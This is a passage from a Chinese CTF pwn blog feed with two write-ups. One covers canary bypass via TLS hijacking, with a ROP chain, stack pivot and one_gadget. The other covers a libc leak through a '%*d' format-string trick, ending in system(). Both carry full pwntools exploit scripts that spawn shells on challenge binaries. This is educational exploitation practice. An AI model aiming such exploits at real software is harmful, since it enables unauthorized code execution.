ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.27.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,28835)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=<span class="number">0x602010</span></span><br><span class="line">leave_ret=<span class="number">0x400A9B</span></span><br><span class="line">rdi=<span class="number">0x0000000000400c03</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000400c01</span></span><br><span class="line">rl(<span class="string">&quot;How many bytes do you want to send?&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x1900</span>))</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1010</span>+p64(bss-<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1900</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">libc_base=get_addr64()-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pr(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ogg=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=libc_base+ogg[<span class="number">2</span>]</span><br><span class="line">s(p64(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><font style="color:rgb(35, 38, 59);"></font></p><p><font style="color:rgb(35, 38, 59);"></font></p>]]></content>
    
    
    <summary type="html">TLS劫持过canary</summary>
    
    
    
    <category term="Canary" scheme="https://www.thir0th.xyz/categories/Canary/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>fmt中%*d的利用</title>
    <link href="https://www.thir0th.xyz/posts/1bb30b9a.html"/>
    <id>https://www.thir0th.xyz/posts/1bb30b9a.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-05-07T08:11:20.679Z</updated>
    
    <content type="html"><![CDATA[<p>corectf的一道题，见识到了格式化字符串的新用法%*d</p><p>指针残留，由不规范使用函数造成。</p><p>printf(“%*d”,&amp;a,&amp;b) 格式化字符串在rdi，a和b没有规定但会取rsi rdx中的值</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/43448046/1722575576346-a39674ea-bb70-4ca5-99a2-6aa5300f2689.jpeg" alt=""></p><p>do_printf函数中，只允许读入三个字节，printf here的rsi会残留到第二次printf,第二个printf此时rsi是一个占栈地址，数很大，输出会把缓冲区填满，缓冲区最后有libc地址，%s会直接把libc地址打印出来，拿到libc后直接输入system(调试有点费CPU，第一次遇到虚拟机卡死)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575384708-1f6f2c67-9410-44b8-b21e-06fa02b13c79.png" alt=""><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575721265-4b11ded9-d96d-49e5-97e1-aa9e6d8c1376.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575944381-ce16043b-4f70-4303-a974-de388757ee45.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x1100)&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%*d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 3&quot;</span>)</span><br><span class="line">libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">pr(<span class="built_in">hex</span>(libc))</span><br><span class="line">system=libc-<span class="number">0x19a6f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fmt中%*d的利用</summary>
    
    
    
    <category term="Fmt" scheme="https://www.thir0th.xyz/categories/Fmt/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
</feed>
